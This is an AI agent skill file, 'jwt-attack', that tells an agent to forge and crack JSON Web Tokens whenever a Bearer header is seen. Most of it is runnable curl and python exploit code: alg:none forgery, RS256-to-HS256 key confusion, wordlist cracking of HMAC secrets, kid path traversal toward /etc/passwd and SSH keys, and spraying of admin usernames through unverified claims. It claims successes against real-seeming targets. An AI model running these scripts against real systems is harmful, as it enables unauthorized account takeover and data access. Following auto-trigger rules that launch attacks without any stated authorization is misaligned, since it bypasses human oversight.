---
name: jwt-attack
description: Decode, forge, brute JWTs when Bearer auth header is seen.
version: 1.2.0
revision_date: 2026-10-10
license: MIT
platforms: [linux, macos]
compatibility: Requires curl, python3
tags: [recon, JWT, token, forge, brute-force, signature-verification, claim-confusion]
category: recon
related_skills:
  - api-noauth-hunt
  - js-secrets-extraction
  - firebase-supabase-attack
  - hunt-auth-bypass
  - subdomain-enumeration
  - hunt-schema-enumeration
references:
  - references/unverified-signature-claim-confusion.md
---


## MANDATORY ON INVOCATION

Some harnesses read only the first ~150 lines of this skill when it is triggered. The table below is the mandatory part of this skill — it applies the moment this skill is invoked, before any other tool call.

| # | Requirement | Action |
|---|---|---|
| 1 | Full read | Read the ENTIRE SKILL.md, including everything past this table, before starting any work |
| 2 | Bundled files | This skill ships artifacts: `references/unverified-signature-claim-confusion.md` — list them and treat them as part of this skill's context |
| 3 | Usage | Use the shipped scripts/templates exactly as documented in the body — do not re-implement them inline |
| 4 | Stop condition | Do not run a single hunting/scanning/exploit command until items 1-3 are done |

Markdown checklist (duplicate this check in your working notes):

- [ ] Full SKILL.md read end to end before the first tool call
- [ ] All bundled files enumerated and relevant ones read
- [ ] Protocol confirmed before any work started

# JWT Attack Skill

Complete JWT attack methodology — decode without verification, algorithm confusion (alg:none, RS256→HS256), weak secret brute force (hashcat/john/simple), kid injection, expired token reuse, hardcoded JWT extraction from JS bundles, and the stale-signature claim ladder that detects servers which validate claims but never verify signatures (see `references/unverified-signature-claim-confusion.md`). Confirmed on enterprise-portal (JWT-based sessions), fintech-processor (315 JWT tokens in Efí bank logs), fitness-chain (3 JWT sessions with 2027 expiry), delivery-platform (hardcoded JWTs in JS bundles), and gov-finance-portal (JWT secret leaked in Vite source).

## When to Use

- API uses `Authorization: Bearer eyJ...` headers.
- JavaScript bundles contain `eyJ...` token patterns.
- After `js-secrets-extraction` finds JWT tokens.
- After `api-noauth-hunt` needs token forging for auth bypass.
- Cookies contain `jwt=`, `token=`, or `session=` with base64-encoded values.
- An API returns **different** auth errors as you change claims (tenant → audience → app → user) — run Phase 6.
- Any error of the form `User '<x>' not found` after a bearer token is accepted — the app is mapping a claim to a local account.
- Target is an Entra/Azure AD-fronted internal service, or a Superset / Airflow / Grafana / Metabase derivative with its own local user table.

## Prerequisites

- `terminal` with curl, python3.
- JWT token to attack (from recon).
- For brute force: `hashcat` or `john` for high-speed cracking (optional).

## How to Run

```bash
# Decode JWT without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
if len(parts) == 3:
    for i, part in enumerate(parts[:2]):
        try:
            padded = part + '=' * (4 - len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            print(f'--- Part {i} ---')
            print(json.dumps(json.loads(decoded), indent=2))
        except: print(f'Part {i}: {part[:50]}... (non-JSON)')
"

# Test alg:none attack
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'admin':True,'sub':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

## Quick Reference

| Attack | Prerequisites | Impact | Difficulty |
|--------|-------------|--------|------------|
| alg:none | Server accepts `alg: "none"` | Full admin access | Easy |
| RS256→HS256 | JWT signed with RS256 | Full admin access | Medium (need public key) |
| Weak HMAC secret | HS256 with weak secret | Full admin access | Medium (need to crack) |
| kid injection | Server trusts `kid` header | RCE/LFI | Hard |
| Expired token reuse | Server doesn't validate `exp` | Session persistence | Trivial |
| Hardcoded JWT | JWT found in JS/source | Whatever the JWT grants | Trivial |
| Stale signature (no verification) | Any token you control + a claim-error oracle | Full auth bypass | Easy |
| Claim-as-local-username (`upn: admin`) | Signature unverified + local user table | App-admin privileges | Easy |

## Procedure

### Phase 1 — JWT Decode & Analysis

```bash
JWT="$1"

echo "[*] JWT analysis"

# Split and decode
HEADER=$(echo "$JWT" | cut -d. -f1)
PAYLOAD=$(echo "$JWT" | cut -d. -f2)
SIGNATURE=$(echo "$JWT" | cut -d. -f3)

echo "Header:"
echo "$HEADER" | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(padded))
    print(json.dumps(d, indent=2))
except: print('  (not valid base64 JSON)')
"

echo "Payload:"
echo "$PAYLOAD" | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(padded))
    for k, v in d.items():
        if k in ('exp', 'iat', 'nbf'):
            from datetime import datetime, timezone
            dt = datetime.fromtimestamp(v, tz=timezone.utc)
            print(f'  {k}: {v} ({dt})')
        else:
            print(f'  {k}: {v}')
except: print('  (not valid base64 JSON)')
"

# Check expiration
EXP=$(echo "$JWT" | cut -d. -f2 | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
d = json.loads(base64.urlsafe_b64decode(padded))
print(d.get('exp', 'no-expiry'))
" 2>/dev/null)

if [[ "$EXP" == "no-expiry" ]]; then
  echo "[!] Token has NO expiration — permanent access"
else
  NOW=$(date +%s)
  if [[ "$EXP" -gt "$NOW" ]]; then
    REMAINING=$((EXP - NOW))
    DAYS=$((REMAINING / 86400))
    echo "[+] Token valid for ${DAYS} more days (expires $(date -d @$EXP))"
  else
    echo "[-] Token EXPIRED $(date -d @$EXP)"
  fi
fi
```

### Phase 2 — alg:none Attack

```bash
TARGET="$1"
ENDPOINT="$2"    # Authenticated endpoint to test
ORIGINAL_JWT="$3"  # Any valid JWT to extract claims from

echo "[*] alg:none attack"

# Extract payload from original JWT
PAYLOAD=$(echo "$ORIGINAL_JWT" | cut -d. -f2)

# Forge token with alg=none
FORGED_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED_TOKEN="${FORGED_HEADER}.${PAYLOAD}."

echo "  Forged token: ${FORGED_TOKEN:0:80}..."

# Test
RESP=$(curl -sk --max-time 10 --connect-timeout 10 "$TARGET$ENDPOINT" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -o /dev/null -w "%{http_code}" 2>/dev/null)

if [[ "$RESP" == "200" ]]; then
  echo "  [CRITICAL] alg:none ACCEPTED — full admin access!"
else
  echo "  [-] alg:none rejected (HTTP $RESP)"
fi
```

### Phase 3 — RS256→HS256 Key Confusion

```bash
TARGET="$1"
ENDPOINT="$2"
PUBLIC_KEY_FILE="$3"  # RSA public key (PEM), from /.well-known/jwks.json or source leak

echo "[*] RS256→HS256 key confusion attack"

# Convert public key to symmetric key (the attack: HS256 uses the PUBLIC key as HMAC secret)
JWT_TOOL=$(python3 -c "
import jwt, sys

# Read public key
with open('$PUBLIC_KEY_FILE') as f:
    pubkey = f.read()

# Forge admin token
payload = {'admin': True, 'sub': 'admin', 'iat': $(date +%s)}
try:
    forged = jwt.encode(payload, pubkey, algorithm='HS256')
    print(forged)
except Exception as e:
    print(f'Error: {e}', file=sys.stderr)
" 2>/dev/null)

if [[ -n "$JWT_TOOL" ]] && ! echo "$JWT_TOOL" | grep -q "Error"; then
  echo "  Forged token: ${JWT_TOOL:0:80}..."
  RESP=$(curl -sk --max-time 10 --connect-timeout 10 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $JWT_TOOL" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)
  [[ "$RESP" == "200" ]] && echo "  [CRITICAL] RS256→HS256 confusion ACCEPTED!"
else
  echo "  [-] Forging failed (check public key format)"
fi
```

### Phase 4 — Weak HMAC Secret Brute Force

```bash
JWT="$1"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

echo "[*] Quick HS256 secret brute force"

# Fast Python brute force (top 1000 passwords)
echo "$JWT" | python3 -c "
import sys, hmac, hashlib, base64, json

jwt = sys.stdin.read().strip()
header_b64, payload_b64, sig_b64 = jwt.split('.')
header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))

if header.get('alg') != 'HS256':
    print('[-] Not HS256 — algorithm is:', header.get('alg'))
    sys.exit(0)

# Top secrets to try
secrets = ['secret', 'jwt_secret', 'key', 'password', 'admin', 'changeme',
           'SuperSecret', 'mysecretkey', '123456', 'jwt', 'token',
           'app_secret', 'secret_key', 'auth_token', 'private_key']

for secret in secrets:
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == sig_b64:
        print(f'[CRACKED] Secret: {secret}')
        break
else:
    print('[-] Not in top-15 list')

# Also try from wordlist (first 5000 lines)
try:
    with open('$WORDLIST', 'rb') as f:
        for i, line in enumerate(f):
            if i >= 5000: break
            secret = line.strip()
            sig = base64.urlsafe_b64encode(
                hmac.new(secret, f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
            if sig == sig_b64:
                print(f'[CRACKED from wordlist] Secret: {secret.decode()}')
                break
    else:
        print('[-] Not in first 5000 wordlist entries')
except FileNotFoundError:
    print('[-] Wordlist not found at $WORDLIST')
"
```

### Phase 5 — Kid Injection (path traversal / SQLi)

```bash
TARGET="$1"
ENDPOINT="$2"

echo "[*] kid header injection test"

# Test path traversal in kid header
for KID in "../../../../etc/passwd" "../../.ssh/id_rsa" "file:///etc/passwd"; do
  FORGED_HEADER=$(echo -n "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"$KID\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  FORGED_TOKEN="${FORGED_HEADER}.$(echo -n '{"test":1}' | base64 -w0 | tr '+/' '-_' | tr -d '=').dGVzdA"

  RESP=$(curl -sk --max-time 5 --connect-timeout 5 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $FORGED_TOKEN" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)

  [[ "$RESP" == "500" ]] && echo "  [POTENTIAL] kid=$KID → HTTP $RESP (server error — may indicate processing)"
  sleep 0.3
done
```

### Phase 6 — Stale-Signature Claim Ladder & Claim-as-Local-Username

Full methodology, archive recovery, and post-auth scoping discipline:
`references/unverified-signature-claim-confusion.md`.

Catches servers that check every claim but never verify the signature — including servers that
*reject* `alg:none` yet skip verification for the declared algorithm. Confirmed on Microsoft's
internal "Titan" analytics API (MSRC 144051, Sep 2026): unauthenticated SQL as app admin.

```bash
TARGET="$1"; ENDPOINT="$2"; MY_JWT="$3"   # a token you legitimately control (own test tenant)

# Step 1 — stale-signature probe: mutate ONE claim, keep the signature byte-identical.
# If the server advances to a NEW error instead of a signature error, it never verifies signatures.
stale() {  # stale <claim> <value>
  python3 -I -c "
import base64, json, sys
h, p, sig = '$MY_JWT'.split('.')
pad = lambda x: x + '=' * (-len(x) % 4)
pl = json.loads(base64.urlsafe_b64decode(pad(p)))
pl['$1'] = '$2'
b = base64.urlsafe_b64encode(json.dumps(pl, separators=(',', ':')).encode()).rstrip(b'=').decode()
print(f'{h}.{b}.{sig}')"   # original signature reused verbatim
}

for PAIR in "tid:$TARGET_TID" "aud:$TARGET_AUD" "appid:$TARGET_APPID"; do
  CLAIM="${PAIR%%:*}"; VAL="${PAIR#*:}"
  printf '%-8s ' "$CLAIM"
  curl -sk --max-time 10 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $(stale "$CLAIM" "$VAL")" | head -c 200; echo
done
# Each claim yielding a DIFFERENT error = that claim is checked and the signature is not.

# Step 2 — confirm with an empty signature (note the trailing dot, third segment empty)
FORGED=$(python3 -I -c "
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'}) + '.' + b({
  'aud': '$TARGET_AUD', 'tid': '$TARGET_TID', 'appid': '$TARGET_APPID',
  'upn': 'attacker@example.com', 'oid': '00000000-0000-0000-0000-000000000000'}) + '.')")
curl -sk --max-time 10 "$TARGET$ENDPOINT" -H "Authorization: Bearer $FORGED"
# "User 'attacker@example.com' not found" = auth PASSED, only identity resolution failed.

# Step 3 — the claim is a LOCAL username, not an identity. Spray local account names.
for U in admin administrator root sa superuser system service default guest test; do
  TOK=$(python3 -I -c "
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'}) + '.' + b({
  'aud': '$TARGET_AUD', 'tid': '$TARGET_TID', 'appid': '$TARGET_APPID',
  'upn': '$U', 'oid': '00000000-0000-0000-0000-000000000000'}) + '.')")
  printf '%-16s ' "$U"
  curl -sk --max-time 10 "$TARGET$ENDPOINT" -H "Authorization: Bearer $TOK" | head -c 200; echo
  sleep 0.5
done
```

Spray the same list through every claim that could feed a local lookup: `upn`, `email`,
`preferred_username`, `sub`, `unique_name`, `name`, `username`, `nameid`. Framework defaults first —
Superset/Grafana `admin`, Airflow `airflow`, Keycloak `service-account-<client>`.

**Pair it with surface discovery.** The vulnerable route is often not the one the frontend calls:
enumerate org subdomains for a separate API host, pull its Swagger, and check the `security` block
**per route** — the raw-SQL route is frequently the one with no declared auth. Recover required
enum/parameter values (e.g. a `tableName`) from Wayback snapshots of the app's config, login, and
privacy pages when Swagger ships no examples.

## Pitfalls

- **alg:none is rare.** Most JWT libraries reject it by default since 2017. But legacy apps exist.
- **RS256→HS256 requires the PUBLIC key.** This is usually available at `/.well-known/jwks.json` or in JS bundles.
- **Brute force is slow in Python.** Use `hashcat -m 16500` for HS256 or `john` for production-speed cracking.
- **Laravel Passport uses `jti` validation.** Even if you forge a valid JWT, Passport checks if the `jti` (JWT ID) exists in the database.
- **"alg:none rejected" does not mean "signature verified."** Run the stale-signature probe (Phase 6
  step 1) before writing a target off — Titan rejected nothing and verified nothing.
- **A claim name is not a type guarantee.** `upn` sounds like an email-formatted Entra identity, so
  automation sprays email-shaped values forever. The backend may be using it as a local username;
  `admin` is the single highest-value guess and no email spray will ever reach it.
- **Reading error text is the whole attack.** One error per claim, mutated one at a time. Batch
  mutations collapse the oracle and you learn nothing.
- **Auth0/Firebase use JWKS.** The server fetches the public key from `/.well-known/jwks.json` — alg:none won't work because the server always verifies with the public key.

## Verification

- alg:none: The forged token MUST access a protected resource returning HTTP 200.
- RS256→HS256: The forged token MUST pass server verification using the public key as HMAC secret.
- HS256 brute force: The cracked secret MUST produce a valid signature for a modified payload.
- Hardcoded JWT: The token MUST be tested against the API to confirm it still works.
- Kid injection: Server MUST return a different error for injected kids vs invalid signature (indicates kid processing).
- Stale signature: a mutated payload with the ORIGINAL signature MUST produce a new, claim-specific error (not a signature error) — capture both error strings side by side as evidence.
- Claim-as-local-username: the forged token MUST execute a privileged action (e.g. `SELECT 1` returning `1`), and the local account MUST map to an admin role. Scope with metadata only — row counts via `system.tables.total_rows` and active `system.parts`, at most one `LIMIT 1` sample per sensitive dataset, no cross-dataset correlation, report immediately.

## MANDATORY ON INVOCATION — PROTOCOL RESTATMENT (END OF FILE)

You have reached the end of this SKILL.md. The invocation protocol below is identical to the one at the top of this file. If you are reading this, the full skill context is loaded — confirm the checklist.

| # | Requirement | Action |
|---|---|---|
| 1 | Full read | Read the ENTIRE SKILL.md, including everything past this table, before starting any work |
| 2 | Bundled files | This skill ships artifacts: `references/unverified-signature-claim-confusion.md` — list them and treat them as part of this skill's context |
| 3 | Usage | Use the shipped scripts/templates exactly as documented in the body — do not re-implement them inline |
| 4 | Stop condition | Do not run a single hunting/scanning/exploit command until items 1-3 are done |

Markdown checklist (duplicate this check in your working notes):

- [ ] Full SKILL.md read end to end before the first tool call
- [ ] All bundled files enumerated and relevant ones read
- [ ] Protocol confirmed before any work started
